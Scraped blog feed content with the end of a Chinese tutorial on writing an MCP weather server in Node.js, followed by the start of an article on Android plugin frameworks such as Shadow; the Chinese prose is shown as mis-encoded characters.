<table><thead><tr><th><strong>è§’è‰²</strong></th><th><strong>å®ä½“</strong></th><th><strong>èŒè´£</strong></th></tr></thead><tbody><tr><td><strong>é›‡ä¸» (Client)</strong></td><td>Cursor IDE (çˆ¶è¿›ç¨‹)</td><td>å¯åŠ¨å¹¶ç›‘æ§å·¥å…·ï¼Œå‘é€è°ƒç”¨æŒ‡ä»¤ï¼Œæ¥æ”¶å¹¶å¤„ç†ç»“æœã€‚</td></tr><tr><td><strong>é›‡å‘˜ (Server)</strong></td><td><code>node index.js</code> (å­è¿›ç¨‹)</td><td>æ¥æ”¶æŒ‡ä»¤ï¼Œæ‰§è¡Œå®é™…ä»»åŠ¡ï¼ˆå¦‚ API è°ƒç”¨ã€æ–‡ä»¶è¯»å†™ï¼‰ï¼Œè¿”å›åŸå§‹æ•°æ®ã€‚</td></tr><tr><td><strong>å·¥ä½œåˆåŒ (Protocol)</strong></td><td>MCP åè®®</td><td>è§„å®šäº†æ¡æ‰‹å’Œè°ƒç”¨è¿‡ç¨‹ä¸­ JSON æ•°æ®çš„ç»“æ„å’Œæ ‡å‡†ã€‚</td></tr><tr><td><strong>å¯¹è®²æœº (Transport)</strong></td><td>Stdio (æ ‡å‡†è¾“å…¥/è¾“å‡º)</td><td>å®ç°æœ¬åœ°çˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹ä¹‹é—´å³æ—¶ã€å®‰å…¨çš„é€šä¿¡ã€‚</td></tr></tbody></table>
<p>MCP çš„ç²¾å¦™ä¹‹å¤„åœ¨äºå®ƒçš„<strong>è§£è€¦æ€§</strong>å’Œ<strong>å®‰å…¨æ€§</strong>ï¼šCursor å®¢æˆ·ç«¯æ— éœ€å…³å¿ƒä½ çš„ Server æ˜¯ç”¨ Node.jsã€Python è¿˜æ˜¯ Go ç¼–å†™ã€‚åªè¦ä½ çš„ç¨‹åºç¬¦åˆ MCP åè®®ï¼Œèƒ½å¤Ÿé€šè¿‡å‘½ä»¤è¡Œæµæ¥æ”¶å’Œå‘é€ JSON æ•°æ®ï¼Œå®ƒå°±èƒ½æ— ç¼åœ°æˆä¸º AI çš„å¤–éƒ¨å·¥å…·ï¼Œæå¤§åœ°æ‰©å±•äº† LLM çš„èƒ½åŠ›è¾¹ç•Œã€‚</p>
<hr/>
<p><strong>è‡ªå®šä¹‰MCP Serverä»£ç </strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Server</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@modelcontextprotocol/sdk/server/index.js"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">StdioServerTransport</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@modelcontextprotocol/sdk/server/stdio.js"</span>;
<span class="hljs-keyword">import</span> {
  <span class="hljs-title class_">CallToolRequestSchema</span>,
  <span class="hljs-title class_">ListToolsRequestSchema</span>,
} <span class="hljs-keyword">from</span> <span class="hljs-string">"@modelcontextprotocol/sdk/types.js"</span>;
<span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">"axios"</span>;
<span class="hljs-keyword">import</span> { z } <span class="hljs-keyword">from</span> <span class="hljs-string">"zod"</span>;

<span class="hljs-comment">// 1. Initialize MCP Server</span>
<span class="hljs-keyword">const</span> server = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Server</span>(
  {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"simple-weather-server"</span>,
    <span class="hljs-attr">version</span>: <span class="hljs-string">"1.0.0"</span>,
  },
  {
    <span class="hljs-attr">capabilities</span>: {
      <span class="hljs-attr">tools</span>: {},
    },
  }
);

<span class="hljs-comment">// 2. Define Tool Logic using wttr.in (No API Key required)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getSystemStyleWeather</span>(<span class="hljs-params">location</span>) {
  <span class="hljs-comment">// --- Get Real Local Time (System Time) ---</span>
  <span class="hljs-keyword">const</span> now = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();
  <span class="hljs-keyword">const</span> localTime = now.<span class="hljs-title function_">toLocaleTimeString</span>(<span class="hljs-string">"zh-CN"</span>, {
    <span class="hljs-attr">hour</span>: <span class="hljs-string">"2-digit"</span>,
    <span class="hljs-attr">minute</span>: <span class="hljs-string">"2-digit"</span>,
    <span class="hljs-attr">second</span>: <span class="hljs-string">"2-digit"</span>,
    <span class="hljs-attr">hour12</span>: <span class="hljs-literal">false</span>,
  });
  <span class="hljs-keyword">const</span> localDate = now.<span class="hljs-title function_">toLocaleDateString</span>(<span class="hljs-string">"zh-CN"</span>);

  <span class="hljs-comment">// --- Determine URL ---</span>
  <span class="hljs-comment">// wttr.in automatically detects location by IP if no location is provided</span>
  <span class="hljs-comment">// format=j1 gives us a JSON response</span>
  <span class="hljs-keyword">let</span> url = <span class="hljs-string">"https://wttr.in/?format=j1"</span>;
  <span class="hljs-keyword">if</span> (location) {
    url = <span class="hljs-string">`https://wttr.in/<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(location)}</span>?format=j1`</span>;
  }

  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">get</span>(url);
    <span class="hljs-keyword">const</span> data = response.<span class="hljs-property">data</span>;
    
    <span class="hljs-comment">// Parse wttr.in specific JSON structure</span>
    <span class="hljs-keyword">const</span> current = data.<span class="hljs-property">current_condition</span>[<span class="hljs-number">0</span>];
    <span class="hljs-keyword">const</span> area = data.<span class="hljs-property">nearest_area</span>[<span class="hljs-number">0</span>];

    <span class="hljs-keyword">const</span> weatherInfo = {
      <span class="hljs-attr">location</span>: location || area.<span class="hljs-property">areaName</span>[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>, <span class="hljs-comment">// Use detected name if no input</span>
      <span class="hljs-attr">region</span>: area.<span class="hljs-property">region</span>[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>,
      <span class="hljs-attr">condition</span>: current.<span class="hljs-property">weatherDesc</span>[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>,
      <span class="hljs-attr">temperature_c</span>: current.<span class="hljs-property">temp_C</span>,
      <span class="hljs-attr">feelslike_c</span>: current.<span class="hljs-property">FeelsLikeC</span>,
      <span class="hljs-attr">humidity</span>: current.<span class="hljs-property">humidity</span>,
      <span class="hljs-attr">wind_kph</span>: current.<span class="hljs-property">windspeedKmph</span>,
      <span class="hljs-attr">data_source</span>: <span class="hljs-string">"wttr.in (IP-based auto-location)"</span>
    };

    <span class="hljs-comment">// --- Construct Result ---</span>
    <span class="hljs-keyword">const</span> result = {
      <span class="hljs-attr">status</span>: <span class="hljs-string">"success"</span>,
      <span class="hljs-attr">tool</span>: <span class="hljs-string">"SystemWeatherReporter"</span>,
      <span class="hljs-attr">system_time</span>: <span class="hljs-string">`<span class="hljs-subst">${localDate}</span> <span class="hljs-subst">${localTime}</span>`</span>,
      <span class="hljs-attr">weather</span>: weatherInfo
    };

    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">content</span>: [
        {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"text"</span>,
          <span class="hljs-attr">text</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(result, <span class="hljs-literal">null</span>, <span class="hljs-number">2</span>),
        },
      ],
    };

  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">content</span>: [{ <span class="hljs-attr">type</span>: <span class="hljs-string">"text"</span>, <span class="hljs-attr">text</span>: <span class="hljs-string">`Unable to fetch weather data. Please check your network connection. Error: <span class="hljs-subst">${error.message}</span>`</span> }],
      <span class="hljs-attr">isError</span>: <span class="hljs-literal">true</span>,
    };
  }
}

<span class="hljs-comment">// 3. Register Tools</span>
server.<span class="hljs-title function_">setRequestHandler</span>(<span class="hljs-title class_">ListToolsRequestSchema</span>, <span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">tools</span>: [
      {
        <span class="hljs-attr">name</span>: <span class="hljs-string">"TimeWeatherReporter"</span>,
        <span class="hljs-attr">description</span>: <span class="hljs-string">"Get current system time and weather. Automatically detects location if not specified. No API key required."</span>,
        <span class="hljs-attr">inputSchema</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"object"</span>,
          <span class="hljs-attr">properties</span>: {
            <span class="hljs-attr">location</span>: {
              <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
              <span class="hljs-attr">description</span>: <span class="hljs-string">"Optional. City name (e.g. 'Beijing'). If omitted, uses auto-detection."</span>,
            },
          },
          <span class="hljs-attr">required</span>: [],
        },
      },
    ],
  };
});

<span class="hljs-comment">// 4. Handle Tool Calls</span>
server.<span class="hljs-title function_">setRequestHandler</span>(<span class="hljs-title class_">CallToolRequestSchema</span>, <span class="hljs-keyword">async</span> (request) =&gt; {
  <span class="hljs-keyword">if</span> (request.<span class="hljs-property">params</span>.<span class="hljs-property">name</span> === <span class="hljs-string">"TimeWeatherReporter"</span>) {
    <span class="hljs-keyword">const</span> location = request.<span class="hljs-property">params</span>.<span class="hljs-property">arguments</span>?.<span class="hljs-property">location</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> <span class="hljs-title function_">getSystemStyleWeather</span>(location);
  }
  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Tool not found"</span>);
});

<span class="hljs-comment">// 5. Start Server</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> transport = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StdioServerTransport</span>();
  <span class="hljs-keyword">await</span> server.<span class="hljs-title function_">connect</span>(transport);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"Simple Weather MCP Server running on stdio"</span>);
}

<span class="hljs-title function_">main</span>().<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"Server error:"</span>, error);
  process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">1</span>);
});

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Androidæ’ä»¶åŒ–åŸç†ä¸æ–¹æ¡ˆè¯¦è§£]]></title>    <link>https://juejin.cn/post/7582958136258117668</link>    <guid>https://juejin.cn/post/7582958136258117668</guid>    <pubDate>2025-12-14T08:59:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582958136258117668" data-draft-id="7583215836690120745" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Androidæ’ä»¶åŒ–åŸç†ä¸æ–¹æ¡ˆè¯¦è§£"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2025-12-14T08:59:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é™†ä¸šèª"/> <meta itemprop="url" content="https://juejin.cn/user/13629904404157"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Androidæ’ä»¶åŒ–åŸç†ä¸æ–¹æ¡ˆè¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/13629904404157/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é™†ä¸šèª
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-14T08:59:09.000Z" title="Sun Dec 14 2025 08:59:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Androidæ’ä»¶åŒ–æ˜¯ä¸€ç§å¼€å‘æ¨¡å¼ï¼Œå®ƒå…è®¸æˆ‘ä»¬åŠ¨æ€åœ°åŠ è½½å’Œå¸è½½APKï¼Œä»è€Œå®ç°æ¨¡å—åŒ–å¼€å‘ï¼Œçƒ­æ›´æ–°ç­‰åŠŸèƒ½ã€‚æœ¬æ–‡å°†è¯¦ç»†ä»‹ç»Androidæ’ä»¶åŒ–çš„åŸç†ï¼Œä»¥åŠå‡ ç§ä¸»æµçš„Androidæ’ä»¶åŒ–æ–¹æ¡ˆã€‚</p>
<h2 data-id="heading-0">ä¸€ã€Androidæ’ä»¶åŒ–åŸç†</h2>
<h3 data-id="heading-1">1.1 ç±»åŠ è½½ä¸åŒäº²å§”æ‰˜æœºåˆ¶</h3>
<p>Androidæ’ä»¶åŒ–çš„æ ¸å¿ƒåŸç†æ˜¯åŸºäºJavaçš„ç±»åŠ è½½æœºåˆ¶ã€‚åœ¨Javaä¸­ï¼ŒClassLoaderè´Ÿè´£åŠ è½½ç±»ã€‚æ¯ä¸ªClassLoaderéƒ½æœ‰ä¸€ä¸ªçˆ¶ClassLoaderï¼Œå½“æˆ‘ä»¬å°è¯•åŠ è½½ä¸€ä¸ªç±»æ—¶ï¼ŒClassLoaderä¼šé¦–å…ˆå°è¯•è®©å®ƒçš„çˆ¶ClassLoaderåŠ è½½è¿™ä¸ªç±»ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„åŒäº²å§”æ‰˜æœºåˆ¶ã€‚è¿™ç§æœºåˆ¶å¯ä»¥ç¡®ä¿åŒä¸€ä¸ªç±»åªä¼šè¢«åŠ è½½ä¸€æ¬¡ã€‚</p>
<p>åœ¨Androidæ’ä»¶åŒ–ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„ClassLoaderæ¥åŠ è½½æ’ä»¶ä¸­çš„ç±»ã€‚è¿™ä¸ªClassLoaderçš„çˆ¶ClassLoaderæ˜¯å®¿ä¸»åº”ç”¨çš„ClassLoaderï¼Œå› æ­¤ï¼Œæ’ä»¶ä¸­çš„ç±»å¯ä»¥è®¿é—®å®¿ä¸»åº”ç”¨ä¸­çš„ç±»ï¼Œä½†æ˜¯å®¿ä¸»åº”ç”¨ä¸­çš„ç±»ä¸èƒ½è®¿é—®æ’ä»¶ä¸­çš„ç±»ã€‚
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e64d0fc8afd942439fcc4b6f07f933f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZmG5Lia6IGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766307783&amp;x-signature=Dzm7XdbfBsPd%2BOXh7u49YJuja2U%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h3 data-id="heading-2">1.2 èµ„æºåŠ è½½</h3>
<p>åœ¨Androidä¸­ï¼Œèµ„æºæ–‡ä»¶æ˜¯é€šè¿‡Resourceså¯¹è±¡æ¥åŠ è½½çš„ã€‚æ¯ä¸ªAPKéƒ½æœ‰ä¸€ä¸ªç‹¬ç«‹çš„Resourceså¯¹è±¡ï¼Œç”¨äºåŠ è½½å®ƒè‡ªå·±çš„èµ„æºæ–‡ä»¶ã€‚</p>
<p>åœ¨Androidæ’ä»¶åŒ–ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„Resourceså¯¹è±¡æ¥åŠ è½½æ’ä»¶ä¸­çš„èµ„æºæ–‡ä»¶ã€‚è¿™ä¸ªResourceså¯¹è±¡çš„AssetManageræ˜¯é€šè¿‡åå°„åˆ›å»ºçš„ï¼Œå¯ä»¥åŠ è½½ä»»æ„è·¯å¾„çš„APKæ–‡ä»¶ã€‚</p>
<h3 data-id="heading-3">1.3 å››å¤§ç»„ä»¶æ”¯æŒ</h3>
<p>åœ¨Androidæ’ä»¶åŒ–ä¸­ï¼Œå››å¤§ç»„ä»¶ï¼ˆActivityï¼ŒServiceï¼ŒBroadcastReceiverï¼ŒContentProviderï¼‰çš„æ”¯æŒæ˜¯ä¸€ä¸ªé‡è¦çš„é—®é¢˜ã€‚å› ä¸ºåœ¨Androidç³»ç»Ÿä¸­ï¼Œè¿™äº›ç»„ä»¶éƒ½éœ€è¦åœ¨AndroidManifest.xmlä¸­è¿›è¡Œå£°æ˜ï¼Œè€Œæ’ä»¶APKçš„AndroidManifest.xmlæ˜¯ä¸ä¼šè¢«è§£æçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é‡‡å–ä¸€äº›ç‰¹æ®Šçš„æ‰‹æ®µæ¥æ”¯æŒè¿™äº›ç»„ä»¶ã€‚</p>
<p>Activityï¼šActivityæ˜¯æœ€å¸¸ç”¨çš„ç»„ä»¶ï¼Œä¹Ÿæ˜¯æœ€éœ€è¦æ”¯æŒçš„ç»„ä»¶ã€‚åœ¨æ’ä»¶åŒ–ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡Proxy Activityä»£ç†æˆ–è€…Hookæ–¹å¼æ¥æ”¯æŒActivityã€‚</p>
<p>Serviceï¼šServiceçš„æ”¯æŒä¹Ÿæ˜¯é€šè¿‡ä»£ç†æˆ–è€…Hookæ–¹å¼æ¥å®ç°çš„ã€‚æˆ‘ä»¬å¯ä»¥åœ¨å®¿ä¸»ä¸­é¢„å…ˆå£°æ˜ä¸€äº›ä»£ç†Serviceï¼Œç„¶ååœ¨è¿è¡Œæ—¶å°†è¿™äº›ä»£ç†Serviceæ›¿æ¢ä¸ºæ’ä»¶ä¸­çš„Serviceã€‚</p>
<p>BroadcastReceiverï¼šBroadcastReceiverçš„æ”¯æŒç›¸å¯¹æ¯”è¾ƒç®€å•ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€æ³¨å†ŒBroadcastReceiverï¼Œæˆ–è€…é€šè¿‡Hookæ–¹å¼æ¥æ”¯æŒé™æ€æ³¨å†Œçš„BroadcastReceiverã€‚</p>
<p>ContentProviderï¼šContentProviderçš„æ”¯æŒæ˜¯æœ€å¤æ‚çš„ï¼Œå› ä¸ºContentProvideråœ¨åº”ç”¨å¯åŠ¨æ—¶å°±ä¼šè¢«åˆ›å»ºï¼Œè€Œä¸”æ¯ä¸ªContentProvideréƒ½éœ€è¦ä¸€ä¸ªå”¯ä¸€çš„authorityã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡Hookæ–¹å¼æ¥æ”¯æŒContentProviderï¼Œæˆ–è€…ä½¿ç”¨ä¸€äº›ç‰¹æ®Šçš„æŠ€å·§ï¼Œä¾‹å¦‚ä½¿ç”¨åŒä¸€ä¸ªauthorityæ¥æ”¯æŒå¤šä¸ªContentProviderã€‚</p>
<h3 data-id="heading-4">1.4 ä¸¤ç§æ”¯æŒActivityçš„æ–¹å¼</h3>
<p><strong>æ‰€æœ‰çš„æ’ä»¶æ¡†æ¶åœ¨è§£å†³çš„é—®é¢˜éƒ½ä¸æ˜¯å¦‚ä½•åŠ¨æ€åŠ è½½ç±»ï¼Œè€Œæ˜¯åŠ¨æ€åŠ è½½çš„Activityæ²¡æœ‰åœ¨AndroidManifestä¸­æ³¨å†Œï¼Œè¯¥å¦‚ä½•èƒ½æ­£å¸¸è¿è¡Œã€‚å¦‚æœAndroidç³»ç»Ÿæ²¡æœ‰AndroidManifestçš„é™åˆ¶ï¼Œé‚£ä¹ˆæ‰€æœ‰æ’ä»¶æ¡†æ¶éƒ½æ²¡æœ‰å­˜åœ¨çš„å¿…è¦äº†ã€‚å› ä¸ºJavaè¯­è¨€æœ¬èº«å°±æ”¯æŒåŠ¨æ€æ›´æ–°å®ç°çš„èƒ½åŠ›ã€‚</strong></p>
<ol>
<li>
<p>Proxy Activityä»£ç†ï¼šè¿™ç§æ–¹å¼æ˜¯é€šè¿‡åœ¨å®¿ä¸»åº”ç”¨ä¸­é¢„å…ˆå£°æ˜ä¸€äº›ä»£ç†Activityï¼Œç„¶ååœ¨è¿è¡Œæ—¶å°†è¿™äº›ä»£ç†Activityæ›¿æ¢ä¸ºæ’ä»¶ä¸­çš„Activityã€‚è¿™ç§æ–¹å¼çš„ä¼˜ç‚¹æ˜¯å®ç°ç®€å•ï¼Œä½†æ˜¯æœ‰ä¸€äº›é™åˆ¶ï¼Œä¾‹å¦‚æ— æ³•æ”¯æŒæ’ä»¶ä¸­çš„Activityåœ¨AndroidManifest.xmlä¸­å£°æ˜çš„ä¸€äº›å±æ€§ã€‚</p>
</li>
<li>
<p>Hookæ–¹å¼ï¼šè¿™ç§æ–¹å¼æ˜¯é€šè¿‡Hook AMSï¼ˆActivity Manager Serviceï¼‰ï¼Œæ›¿æ¢AMSä¸­çš„ä¸€äº›æ–¹æ³•ï¼Œä»è€Œç»•è¿‡AMSçš„æ£€æŸ¥ã€‚è¿™ç§æ–¹å¼çš„ä¼˜ç‚¹æ˜¯å¯ä»¥å®Œå…¨æ”¯æŒæ’ä»¶ä¸­çš„Activityï¼Œä½†æ˜¯å®ç°å¤æ‚ï¼Œéœ€è¦å¯¹Androidç³»ç»Ÿæœ‰æ·±å…¥çš„äº†è§£ã€‚</p>
</li>
</ol>
<h2 data-id="heading-5">äºŒã€Androidæ’ä»¶åŒ–æ–¹æ¡ˆ</h2>
<p>ç›®å‰ï¼Œå¸‚é¢ä¸Šæœ‰å‡ ç§ä¸»æµçš„Androidæ’ä»¶åŒ–æ–¹æ¡ˆï¼ŒåŒ…æ‹¬Shadowï¼ŒRePluginï¼ŒAABï¼ˆAndroid App Bundleï¼‰ï¼ŒQigsawï¼Œä»¥åŠAtlasã€‚</p>
<h3 data-id="heading-6">2.1 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTencent%2FShadow" target="_blank" title="https://github.com/Tencent/Shadow" ref="nofollow noopener noreferrer">Shadow</a></h3>
<h4 data-id="heading-7">2.1.1 Shadowç®€ä»‹</h4>
<p>Shadowæ˜¯è…¾è®¯å¼€å‘çš„ä¸€æ¬¾æ’ä»¶åŒ–æ¡†æ¶ï¼Œå…¶è®¾è®¡ç›®æ ‡æ˜¯ä¸ä¿®æ”¹APKæ–‡ä»¶çš„æƒ…å†µä¸‹å®ç°æ’ä»¶åŒ–ã€‚Shadowé€šè¿‡åˆ›å»ºä¸€ä¸ªæ–°çš„ClassLoaderæ¥åŠ è½½æ’ä»¶ï¼Œä»è€Œå®ç°æ’ä»¶çš„åŠ¨æ€åŠ è½½å’Œå¸è½½ã€‚</p>
<ul>
<li>Shadowæ‰€æŒ‡çš„æ’ä»¶æ˜¯æ’ä»¶çš„ä»£ç å®Œå…¨æ˜¯ä¸€ä¸ªæ­£å¸¸å¯å®‰è£…çš„Appä»£ç ï¼Œæ— éœ€å¼•ç”¨ä»»ä½•Shadowçš„åº“ã€‚è¿™æ ·çš„Appä»£ç åº”ç”¨äº†Shadowä¹‹åå¯ä»¥å…å®‰è£…è¿è¡Œåœ¨å¦ä¸€ä¸ªAppä¸­ã€‚</li>
<li>Shadowæ˜¯ä¸€ä¸ªå®Œå…¨æ— Hackï¼Œç”šè‡³é›¶åå°„å®ç°çš„Androidæ’ä»¶æ¡†æ¶ã€‚</li>
<li>Shadowæ˜¯ä¸€ä¸ªå…¨åŠ¨æ€å®ç°çš„æ’ä»¶æ¡†æ¶ï¼Œå°±æ˜¯è¯´æ’ä»¶æ¡†æ¶çš„ä»£ç è·Ÿæ’ä»¶çš„ä»£ç ä¸€æ ·éƒ½æ˜¯åŠ¨æ€å‘å¸ƒçš„ã€‚</li>
</ul>
